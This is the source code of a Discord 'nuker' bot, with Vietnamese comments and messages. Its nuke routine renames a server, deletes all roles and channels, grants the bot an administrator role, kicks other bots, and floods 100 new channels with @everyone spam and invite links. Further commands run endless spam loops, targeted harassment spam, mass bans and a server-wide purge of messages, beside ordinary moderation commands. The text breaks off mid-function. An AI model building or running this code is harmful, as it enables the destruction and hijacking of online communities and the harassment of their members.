import asyncio
import os
import sys
import random
import discord
from discord.ext import commands
import aiohttp
from datetime import timedelta, datetime, timezone
import json
import math

# ==================== KEEP_ALIVE (nếu dùng) ====================
try:
    from keep_alive import keep_alive
except ImportError:
    def keep_alive():
        pass

# ==================== CẤU HÌNH HỆ THỐNG ====================
DISCORD_TOKEN = os.getenv("TOKEN")

# Danh sách ID của Boss Bảo và các đồng minh ủy quyền
BOT_OWNERS = [
    1540585511842881616,
    1542453882263707759,
    1502969774202814625,
]

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.bans = True
intents.moderation = True
intents.webhooks = True

def get_prefix(bot, message):
    if message.content.lower().startswith("nuked "):
        return "nuked "
    elif message.content.lower().startswith("nuked"):
        return "nuked"
    return "nuked "

bot = commands.Bot(command_prefix=get_prefix, intents=intents)
bot.remove_command('help')  # Xóa help gốc

# ==================== BIẾN TOÀN CỤ ====================
spam_task_running = None
is_spamming = False  # Thêm để kiểm soát spam loop
bot_enabled = True

# Lưu cấu hình kênh
SERVER_LOG_CHANNELS = {}
WELCOME_CHANNELS = {}
GOODBYE_CHANNELS = {}
SERVER_LEVEL_CHANNELS = {}
DISABLED_COMMANDS = set()

# Dữ liệu người dùng
USER_LEVELS = {}
user_coins = {}
user_inventory = {}
marriages = {}
daily_cooldowns = {}  # Lưu lần nhận daily gần nhất

# Đường dẫn file JSON
LEVEL_FILE = "levels.json"
CONFIG_FILE = "config.json"
COIN_FILE = "coins.json"
INVENTORY_FILE = "inventory.json"
MARRIAGE_FILE = "marriages.json"
DAILY_FILE = "daily.json"

# ==================== TẢI / LƯU DỮ LIỆU ====================
def load_json(file, default={}):
    try:
        with open(file, "r", encoding="utf-8") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return default

def save_json(file, data):
    with open(file, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def load_all_data():
    global USER_LEVELS, user_coins, user_inventory, marriages, daily_cooldowns, SERVER_LOG_CHANNELS, WELCOME_CHANNELS, GOODBYE_CHANNELS, SERVER_LEVEL_CHANNELS, BOT_OWNERS, DISABLED_COMMANDS
    USER_LEVELS = load_json(LEVEL_FILE, {})
    user_coins = load_json(COIN_FILE, {})
    user_inventory = load_json(INVENTORY_FILE, {})
    marriages = load_json(MARRIAGE_FILE, {})
    daily_cooldowns = load_json(DAILY_FILE, {})
    
    config = load_json(CONFIG_FILE, {})
    SERVER_LOG_CHANNELS = config.get("log_channels", {})
    WELCOME_CHANNELS = config.get("welcome_channels", {})
    GOODBYE_CHANNELS = config.get("goodbye_channels", {})
    SERVER_LEVEL_CHANNELS = config.get("level_channels", {})
    BOT_OWNERS = config.get("owners", BOT_OWNERS)
    DISABLED_COMMANDS = set(config.get("disabled_commands", []))

def save_all_data():
    save_json(LEVEL_FILE, USER_LEVELS)
    save_json(COIN_FILE, user_coins)
    save_json(INVENTORY_FILE, user_inventory)
    save_json(MARRIAGE_FILE, marriages)
    save_json(DAILY_FILE, daily_cooldowns)
    config = {
        "log_channels": SERVER_LOG_CHANNELS,
        "welcome_channels": WELCOME_CHANNELS,
        "goodbye_channels": GOODBYE_CHANNELS,
        "level_channels": SERVER_LEVEL_CHANNELS,
        "owners": BOT_OWNERS,
        "disabled_commands": list(DISABLED_COMMANDS)
    }
    save_json(CONFIG_FILE, config)

load_all_data()

# ==================== HẰNG SỐ GIAO DIỆN ====================
CUSTOM_SETUP_GIF = "https://i.pinimg.com/originals/7a/41/bb/7a41bb51fe3babe0c6cee161f85df62c.gif"
NUKE_GIF_URL = "https://media.discordapp.net/attachments/1541456087105151066/1542122209156538388/739ed3f3955356f06352d43eb649168a.gif"
NUKE_AVATAR_URL = "https://media.discordapp.net/attachments/1541456087105151066/1542127023810416660/8b59ed006d0073e951a47e1da3c2d111.jpg"
HELP_THUMBNAIL_GIF = "https://i.pinimg.com/originals/08/24/02/082402127402f0672076046e7f1d43eb.gif"

# ==================== HÀM TIỆN ÍCH ====================
def get_required_exp(level: int) -> int:
    return level * 100

def get_user_coins(user_id):
    return user_coins.get(str(user_id), 0)

def add_coins(user_id, amount):
    uid = str(user_id)
    user_coins[uid] = user_coins.get(uid, 0) + amount
    save_json(COIN_FILE, user_coins)

def subtract_coins(user_id, amount):
    uid = str(user_id)
    cur = user_coins.get(uid, 0)
    if cur < amount:
        return False
    user_coins[uid] = cur - amount
    save_json(COIN_FILE, user_coins)
    return True

def get_user_level(user_id):
    uid = str(user_id)
    if uid not in USER_LEVELS:
        USER_LEVELS[uid] = {"level": 1, "exp": 0}
        save_json(LEVEL_FILE, USER_LEVELS)
    return USER_LEVELS[uid]["level"]

def add_exp(user_id, exp):
    uid = str(user_id)
    if uid not in USER_LEVELS:
        USER_LEVELS[uid] = {"level": 1, "exp": 0}
    USER_LEVELS[uid]["exp"] += exp
    lv = USER_LEVELS[uid]["level"]
    while USER_LEVELS[uid]["exp"] >= get_required_exp(lv):
        USER_LEVELS[uid]["exp"] -= get_required_exp(lv)
        USER_LEVELS[uid]["level"] += 1
        lv += 1
        # Thông báo level up sẽ được xử lý ở sự kiện on_message
    save_json(LEVEL_FILE, USER_LEVELS)
    return USER_LEVELS[uid]["level"]

async def send_log(guild_id, embed):
    for gid, chid in SERVER_LOG_CHANNELS.items():
        if int(gid) == guild_id:
            channel = bot.get_channel(chid)
            if channel:
                try:
                    await channel.send(embed=embed)
                except:
                    pass

# ==================== DECORATOR OWNER ====================
def is_bot_owner():
    async def predicate(ctx):
        return ctx.author.id in BOT_OWNERS
    return commands.check(predicate)

# ==================== LỆNH PHÁ HOẠI (GIỮ NGUYÊN) ====================
# -------------------- NUKE CONFIRM VIEW --------------------
class NukeConfirmView(discord.ui.View):
    def __init__(self, guild: discord.Guild, channel: discord.abc.Messageable):
        super().__init__(timeout=60)
        self.guild = guild
        self.channel = channel

    async def on_timeout(self):
        for item in self.children:
            item.disabled = True

    @discord.ui.button(label="🟢 ĐỒNG Ý NUKE SERVER", style=discord.ButtonStyle.green)
    async def confirm_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("✅ Đã xác nhận! Đang tiến hành...", ephemeral=True)
        await self.channel.send("⚠️ Từ từ đang check sever đã...")
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(view=self)
        self.stop()
        await execute_nuke(self.guild)

    @discord.ui.button(label="🔴 TỪ CHỐI", style=discord.ButtonStyle.red)
    async def cancel_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(view=self)
        await interaction.response.send_message(f"❌ Bạn đã từ chối nuke sever {self.guild.name}", ephemeral=True)
        self.stop()

async def execute_nuke(guild):
    try:
        nuke_log_embed = discord.Embed(
            title="🔥 CẢNH BÁO: LỆNH NUKE ĐƯỢC THỰC THI!",
            description=f"Server bị nuke: **{guild.name}** (`{guild.id}`)",
            color=0xFF0000
        )
        await send_log(guild.id, nuke_log_embed)

        supreme_role = None
        async def prep_nuke():
            nonlocal supreme_role
            tasks = []
            tasks.append(guild.edit(name="NUKE BY BỐ BẢO ĐZ"))
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(NUKE_AVATAR_URL) as resp:
                        if resp.status == 200:
                            image_data = await resp.read()
                            tasks.append(guild.edit(icon=image_data))
            except:
                pass

            for role in guild.roles:
                if role.name != "@everyone":
                    tasks.append(role.delete())

            await asyncio.gather(*tasks, return_exceptions=True)

            try:
                supreme_role = await guild.create_role(
                    name="👑 ℕ𝕌𝕂𝔼ℝ 𝕆ℕ 𝕋𝕆ℙ 👑",
                    permissions=discord.Permissions(administrator=True),
                    color=discord.Color.red(),
                    hoist=True
                )
                await guild.me.add_roles(supreme_role)
            except Exception as e:
                print(f"Lỗi tạo/add role tối cao: {e}")

            bot_members = [m for m in guild.members if m.bot and m.id != bot.user.id]
            chunk_size = 10
            for i in range(0, len(bot_members), chunk_size):
                chunk = bot_members[i:i + chunk_size]
                kick_tasks = [m.kick(reason="Anti-bot / Nuke cleanup") for m in chunk]
                await asyncio.gather(*kick_tasks, return_exceptions=True)

        await prep_nuke()

        channels_to_delete = list(guild.channels)
        for i in range(0, len(channels_to_delete), 15):
            batch = channels_to_delete[i:i+15]
            del_tasks = [ch.delete() for ch in batch]
            await asyncio.gather(*del_tasks, return_exceptions=True)

        await asyncio.sleep(1.0)

        created_channels = []
        for i in range(0, 100, 60):
            batch_create = []
            for j in range(i, min(i + 60, 100)):
                channel_name = NUKE_CHANNEL_NAMES[j % len(NUKE_CHANNEL_NAMES)]
                batch_create.append(guild.create_text_channel(name=channel_name))
            res = await asyncio.gather(*batch_create, return_exceptions=True)
            for r in res:
                if isinstance(r, discord.TextChannel):
                    created_channels.append(r)
            await asyncio.sleep(2.0)

        spam_content = (
            "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – HOT WAR BOT ●'◡'●)\n"
            "|| @everyone||\n"
            "|| @here ||\n"
            '"|| link support 1 ||: https://discord.gg/Grr6RWe9A"\n'
            ' "|| link support 2 ||:https://discord.gg/4wrsMbRVpU"'
        )

        valid_channels = [ch for ch in created_channels if isinstance(ch, discord.TextChannel)]
        for _ in range(10):
            batch_spam = []
            for _ in range(250):
                ch = random.choice(valid_channels) if valid_channels else None
                if ch:
                    async def send_fast(c=ch):
                        try:
                            embed = discord.Embed()
                            embed.set_image(url=NUKE_GIF_URL)
                            await c.send(spam_content, embed=embed)
                        except:
                            pass
                    batch_spam.append(send_fast())
            if batch_spam:
                await asyncio.gather(*batch_spam, return_exceptions=True)
            await asyncio.sleep(0.5)

    except Exception as e:
        print(f"Lỗi Nuke: {e}")

# -------------------- LỆNH PHÁ HOẠI --------------------
@bot.command(name="nuke")
@is_bot_owner()
async def nuke(ctx):
    embed = discord.Embed(
        title="⚠️ XÁC NHẬN NUKE SERVER ⚠️",
        description=f"Bạn có chắc chắn muốn **XÓA SẠCH VÀ PHÁ HOẠI** server **{ctx.guild.name}** không?\nHành động này không thể hoàn tác!",
        color=0xFF0000
    )
    embed.set_thumbnail(url=CUSTOM_SETUP_GIF)
    view = NukeConfirmView(ctx.guild, ctx.channel)
    await ctx.send(embed=embed, view=view)

@nuke.error
async def nuke_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="spam")
@is_bot_owner()
async def start_spam(ctx):
    global is_spamming, spam_task_running
    if is_spamming:
        await ctx.send("❌ Hệ thống spam đang chạy rồi!")
        return

    is_spamming = True
    await ctx.send("🚀 **ĐÃ BẮT ĐẦU SPAM!**")

    async def spam_loop():
        global is_spamming
        spam_text = (
            "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – HOT WAR BOT ●'◡'●)\n"
            "|| @everyone||\n"
            "|| @here ||\n"
            '"|| link support 1 ||: https://discord.gg/Grr6RWe9A"\n'
            ' "|| link support 2 ||:https://discord.gg/4wrsMbRVpU"'
        )
        while is_spamming:
            channels = [ch for ch in ctx.guild.text_channels if ch.permissions_for(ctx.guild.me).send_messages]
            if not channels:
                await asyncio.sleep(1)
                continue
            
            tasks = []
            for _ in range(30):
                ch = random.choice(channels)
                async def send_msg(target_ch=ch):
                    try:
                        embed = discord.Embed()
                        embed.set_image(url=NUKE_GIF_URL)
                        await target_ch.send(spam_text, embed=embed)
                    except:
                        pass
                tasks.append(send_msg())
            
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.3)

    spam_task_running = asyncio.create_task(spam_loop())

@start_spam.error
async def start_spam_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="stopspam")
@is_bot_owner()
async def stop_spam(ctx):
    global is_spamming, spam_task_running
    if not is_spamming:
        await ctx.send("❌ Hệ thống spam đang không chạy!")
        return

    is_spamming = False
    if spam_task_running:
        spam_task_running.cancel()
        spam_task_running = None
    await ctx.send("🛑 **ĐÃ DỪNG SPAM TẤT CẢ KÊNH!**")

@stop_spam.error
async def stop_spam_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="spamroast")
@is_bot_owner()
async def spam_roast(ctx, member: discord.Member, count: int = 10):
    if count > 50:
        count = 50
    await ctx.send(f"🚀 **Bắt đầu spam chửi {member.mention} ({count} lần)...**")
    for i in range(count):
        roast_template = random.choice(ROAST_LINES)
        msg = roast_template.format(username=member.mention)
        try:
            await ctx.send(msg)
        except:
            pass
        await asyncio.sleep(0.8)

@spam_roast.error
async def spam_roast_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH OWNER (QUẢN TRỊ) ====================
@bot.command(name="kick")
@is_bot_owner()
async def kick_user(ctx, member: discord.Member, *, reason: str = "Không có lý do"):
    try:
        if member.id == ctx.author.id:
            await ctx.send("❌ Không thể kick chính mình!")
            return
        if member.id in BOT_OWNERS:
            await ctx.send("❌ Không thể kick Owner!")
            return
        await member.kick(reason=reason)
        embed = discord.Embed(
            title="🦵 ĐÃ KICK THÀNH VIÊN",
            description=f"👤 **Người bị kick:** {member.mention}\n📌 **Lý do:** {reason}\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0xFF9900
        )
        embed.set_thumbnail(url=member.display_avatar.url)
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@kick_user.error
async def kick_user_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="ban")
@is_bot_owner()
async def ban_user(ctx, member: discord.Member, *, reason: str = "Không có lý do"):
    try:
        if member.id == ctx.author.id:
            await ctx.send("❌ Không thể ban chính mình!")
            return
        if member.id in BOT_OWNERS:
            await ctx.send("❌ Không thể ban Owner!")
            return
        await member.ban(reason=reason)
        embed = discord.Embed(
            title="🔨 ĐÃ BAN THÀNH VIÊN",
            description=f"👤 **Người bị ban:** {member.mention}\n📌 **Lý do:** {reason}\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0xFF0000
        )
        embed.set_thumbnail(url=member.display_avatar.url)
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@ban_user.error
async def ban_user_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="unban")
@is_bot_owner()
async def unban_user(ctx, user_id: int, *, reason: str = "Không có lý do"):
    try:
        user = await bot.fetch_user(user_id)
        await ctx.guild.unban(user, reason=reason)
        embed = discord.Embed(
            title="✅ ĐÃ UNBAN THÀNH VIÊN",
            description=f"👤 **Người được unban:** {user.mention}\n📌 **Lý do:** {reason}\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_thumbnail(url=user.display_avatar.url)
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@unban_user.error
async def unban_user_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="massban")
@is_bot_owner()
async def massban(ctx, *members: discord.Member):
    if not members:
        await ctx.send("❌ Cần tag ít nhất 1 người. VD: `nuked massban @user1 @user2`")
        return
    success = 0
    failed = 0
    for member in members:
        if member.id == ctx.author.id or member.id in BOT_OWNERS or member == ctx.guild.owner:
            failed += 1
            continue
        try:
            await member.ban(reason="Mass ban từ Boss Bảo")
            success += 1
        except:
            failed += 1

    embed = discord.Embed(
        title="🔨 KẾT QUẢ MASS BAN",
        description=f"✅ Đã ban: **{success}** thành viên\n❌ Thất bại: **{failed}** thành viên",
        color=0xFF0000
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

@massban.error
async def massban_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="mute")
@is_bot_owner()
async def mute_user(ctx, member: discord.Member, minutes: int = 10, *, reason: str = "Không có lý do"):
    try:
        duration = timedelta(minutes=minutes)
        await member.timeout(duration, reason=reason)
        embed = discord.Embed(
            title="🔇 ĐÃ TẮT TIẾNG THÀNH VIÊN",
            description=f"👤 **Người bị mute:** {member.mention}\n⏱️ **Thời gian:** {minutes} phút\n📌 **Lý do:** {reason}",
            color=0xFF9900
        )
        embed.set_thumbnail(url=member.display_avatar.url)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@mute_user.error
async def mute_user_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="unmute")
@is_bot_owner()
async def unmute_user(ctx, member: discord.Member):
    try:
        await member.timeout(None)
        embed = discord.Embed(
            title="🔊 ĐÃ BỎ TẮT TIẾNG",
            description=f"👤 **Thành viên:** {member.mention} đã có thể chat lại.",
            color=0x00FF00
        )
        embed.set_thumbnail(url=member.display_avatar.url)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@unmute_user.error
async def unmute_user_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH QUẢN LÝ KÊNH & ROLE ====================
@bot.command(name="createchannel")
@is_bot_owner()
async def create_channel(ctx, *, name: str):
    try:
        channel = await ctx.guild.create_text_channel(name)
        embed = discord.Embed(
            title="🆕 ĐÃ TẠO KÊNH MỚI",
            description=f"📌 **Tên kênh:** {channel.mention}\n👑 **Người tạo:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@create_channel.error
async def create_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="deletechannel")
@is_bot_owner()
async def delete_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        channel = ctx.channel
    try:
        channel_name = channel.name
        await channel.delete()
        embed = discord.Embed(
            title="🗑️ ĐÃ XÓA KÊNH",
            description=f"📌 **Tên kênh:** `{channel_name}`\n👑 **Người xóa:** {ctx.author.mention}",
            color=0xFF0000
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@delete_channel.error
async def delete_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="lockchannel")
@is_bot_owner()
async def lock_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        channel = ctx.channel
    try:
        await channel.set_permissions(ctx.guild.default_role, send_messages=False)
        embed = discord.Embed(
            title="🔒 ĐÃ KHÓA KÊNH",
            description=f"📌 **Kênh:** {channel.mention}\n🔒 Mọi người không thể gửi tin nhắn vào kênh này nữa.",
            color=0xFF0000
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@lock_channel.error
async def lock_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="unlockchannel")
@is_bot_owner()
async def unlock_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        channel = ctx.channel
    try:
        await channel.set_permissions(ctx.guild.default_role, send_messages=True)
        embed = discord.Embed(
            title="🔓 ĐÃ MỞ KHÓA KÊNH",
            description=f"📌 **Kênh:** {channel.mention}\n🔓 Mọi người đã có thể gửi tin nhắn bình thường.",
            color=0x00FF00
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@unlock_channel.error
async def unlock_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="createrole")
@is_bot_owner()
async def create_role(ctx, *, role_name: str):
    try:
        role = await ctx.guild.create_role(name=role_name, reason="Lệnh từ Boss Bảo")
        embed = discord.Embed(
            title="🎭 ĐÃ TẠO ROLE MỚI",
            description=f"📌 **Role:** {role.mention}\n👑 **Người tạo:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@create_role.error
async def create_role_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="deleterole")
@is_bot_owner()
async def delete_role(ctx, *, role_name: str):
    try:
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        if not role:
            await ctx.send(f"❌ Không tìm thấy role `{role_name}`!")
            return
        role_n = role.name
        await role.delete(reason="Lệnh từ Boss Bảo")
        embed = discord.Embed(
            title="🗑️ ĐÃ XÓA ROLE",
            description=f"📌 **Role:** `{role_n}`\n👑 **Người xóa:** {ctx.author.mention}",
            color=0xFF0000
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@delete_role.error
async def delete_role_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="role")
@is_bot_owner()
async def add_role_to_user(ctx, member: discord.Member, *, role_name: str):
    try:
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        if not role:
            await ctx.send(f"❌ Không tìm thấy role `{role_name}`!")
            return
        await member.add_roles(role, reason=f"Lệnh từ Boss Bảo")
        embed = discord.Embed(
            title="✅ ĐÃ THÊM ROLE",
            description=f"👤 **Người nhận:** {member.mention}\n🎭 **Role:** {role.mention}\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_thumbnail(url=member.display_avatar.url)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@add_role_to_user.error
async def add_role_to_user_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="removerole")
@is_bot_owner()
async def remove_role_from_user(ctx, member: discord.Member, *, role_name: str):
    try:
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        if not role:
            await ctx.send(f"❌ Không tìm thấy role `{role_name}`!")
            return
        await member.remove_roles(role, reason=f"Lệnh từ Boss Bảo")
        embed = discord.Embed(
            title="✅ ĐÃ XÓA ROLE",
            description=f"👤 **Người bị xóa:** {member.mention}\n🎭 **Role:** {role.mention}\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0xFF9900
        )
        embed.set_thumbnail(url=member.display_avatar.url)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@remove_role_from_user.error
async def remove_role_from_user_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="purge")
@is_bot_owner()
async def purge_all(ctx, confirm: str = None):
    if confirm is None or confirm.lower() != "all":
        await ctx.send("⚠️ **CẢNH BÁO!** Lệnh này sẽ xóa TOÀN BỘ tin nhắn trong server!\n🔹 Gõ `nuked purge all` để xác nhận.")
        return

    embed = discord.Embed(
        title="🧹 ĐANG XÓA TOÀN BỘ TIN NHẮN...",
        description="⏳ Đang xử lý, vui lòng đợi...",
        color=0xFF9900
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

    try:
        total_deleted = 0
        for channel in ctx.guild.channels:
            if isinstance(channel, discord.TextChannel):
                try:
                    deleted = await channel.purge(limit=1000)
                    total_deleted += len(deleted)
                    await asyncio.sleep(1)
                except:
                    pass
        embed = discord.Embed(
            title="✅ ĐÃ XÓA TOÀN BỘ TIN NHẮN",
            description=f"🧹 Đã xóa tổng cộng **{total_deleted}** tin nhắn trong server!\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@purge_all.error
async def purge_all_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="clear")
@is_bot_owner()
async def clear(ctx, amount: int = 10):
    if amount < 1 or amount > 1000:
        await ctx.send("⚠️ Số lượng từ 1 đến 1000.")
        return
    try:
        deleted = await ctx.channel.purge(limit=amount)
        embed = discord.Embed(
            title="🧹 ĐÃ XÓA TIN NHẮN",
            description=f"Đã xóa thành công **{len(deleted)}** tin nhắn.",
            color=0x00CCFF
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed, delete_after=5)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@clear.error
async def clear_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="createcategory")
@is_bot_owner()
async def create_category(ctx, *, name: str):
    try:
        category = await ctx.guild.create_category(name)
        embed = discord.Embed(
            title="📁 ĐÃ TẠO DANH MỤC MỚI",
            description=f"✅ Danh mục **{category.name}** đã được tạo thành công.",
            color=0x00FF00
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@create_category.error
async def create_category_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="move")
@is_bot_owner()
async def move_member(ctx, member: discord.Member, channel: discord.VoiceChannel):
    try:
        await member.move_to(channel)
        embed = discord.Embed(
            title="🚪 ĐÃ DI CHUYỂN THÀNH VIÊN",
            description=f"👤 {member.mention} đã được chuyển vào kênh {channel.mention}",
            color=0x00FF00
        )
        embed.set_thumbnail(url=member.display_avatar.url)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@move_member.error
async def move_member_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="settopic")
@is_bot_owner()
async def set_topic(ctx, channel: discord.TextChannel, *, topic: str):
    try:
        await channel.edit(topic=topic)
        embed = discord.Embed(
            title="📝 ĐÃ ĐẶT CHỦ ĐỀ KÊNH",
            description=f"📌 **Kênh:** {channel.mention}\n**Chủ đề:** {topic}",
            color=0x00FF00
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@set_topic.error
async def set_topic_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="setnsfw")
@is_bot_owner()
async def set_nsfw(ctx, channel: discord.TextChannel, nsfw: bool):
    try:
        await channel.edit(nsfw=nsfw)
        status = "Bật" if nsfw else "Tắt"
        embed = discord.Embed(
            title="🔞 ĐÃ THAY ĐỔI CHẾ ĐỘ NSFW",
            description=f"📌 **Kênh:** {channel.mention}\n**Trạng thái:** {status}",
            color=0x00FF00 if nsfw else 0xFF9900
        )
